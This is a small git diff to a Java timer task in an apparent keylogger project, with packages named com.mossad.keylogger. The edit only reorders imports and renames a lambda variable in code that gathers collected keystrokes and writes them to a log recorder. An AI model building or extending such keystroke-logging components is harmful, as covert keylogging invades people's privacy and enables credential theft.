@@ -1,8 +1,7 @@
 package com.mossad.keylogger.timer;
 
-import com.mossad.keylogger.reader.KeyReader;
 import com.mossad.keylogger.logging.LogRecorder;
-
+import com.mossad.keylogger.reader.KeyReader;
 import java.util.List;
 import java.util.TimerTask;
 
@@ -20,7 +19,7 @@ public class WriterTask extends TimerTask {
     public void run() {
         List<String> keys = keyReader.getCollectedKeys();
         StringBuilder stringBuilder = new StringBuilder();
-        keys.forEach(ele -> stringBuilder.append(ele));
+        keys.forEach(key -> stringBuilder.append(key));
         logRecorder.writeContent(stringBuilder.toString());
     }
 }
